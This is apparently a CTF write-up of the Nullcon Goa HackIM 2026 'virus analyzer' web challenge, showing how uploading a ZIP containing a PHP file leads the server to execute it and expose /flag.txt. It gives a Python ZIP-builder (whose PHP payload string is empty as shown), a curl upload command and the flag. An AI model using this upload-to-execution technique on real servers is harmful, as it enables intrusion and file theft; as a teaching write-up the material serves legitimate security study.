---
title: "virus analyzer - Nullcon Goa HackIM 2026 CTF"
category: "web"
type: "writeup"
tags: ["web", "virus", "analyzer", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "Event: Nullcon Goa HackIM 2026 CTF"
source:
  name: "CTFtime writeup #40639"
  url: "https://ctftime.org/writeup/40639"
original_source: "https://github.com/RootRunners/Nullcon-Goa-HackIM-2026-CTF-RootRunners-Official-Write-ups/blob/main/Web/virus_analyzer/README.md"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "virus analyzer"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** virus analyzer
- **Author team:** RootRunners
- **CTFtime tags:** web
- **CTFtime:** <https://ctftime.org/writeup/40639>
- **Original writeup:** <https://github.com/RootRunners/Nullcon-Goa-HackIM-2026-CTF-RootRunners-Official-Write-ups/blob/main/Web/virus_analyzer/README.md>

---
# virus analyzer

**Event:** Nullcon Goa HackIM 2026 CTF   
**Category:** Web   
**Points:** 200   
**Service:** `52.59.124.14:5008`

## Overview  
The app accepts ZIP uploads, extracts them to `/uploads/<random>/`, and serves the extracted files directly. If a ZIP contains a `.php` file, it is executed by the server. Command execution is blocked (`Cannot fork`), but file reads work, so reading `/flag.txt` reveals the flag.

## Steps  
1\. Create a ZIP containing a PHP file that prints `/flag.txt`.  
2\. Upload the ZIP.  
3\. Open the returned URL to execute the PHP and read the flag.

## Build the ZIP  
```bash  
python3 - <<'PY'  
import zipfile, os  
php = """"""  
os.makedirs('tmp', exist_ok=True)  
with open('tmp/readflag.php','w') as f: f.write(php)  
with zipfile.ZipFile('tmp/readflag.zip','w') as z: z.write('tmp/readflag.php','readflag.php')  
print('tmp/readflag.zip')  
PY  
```

## Upload  
```bash  
curl -s -i -F 'zipfile=@tmp/readflag.zip' http://52.59.124.14:5008/  
```

## Flag  
`ENO{R4C1NG_UPL04D5_4R3_FUN}`
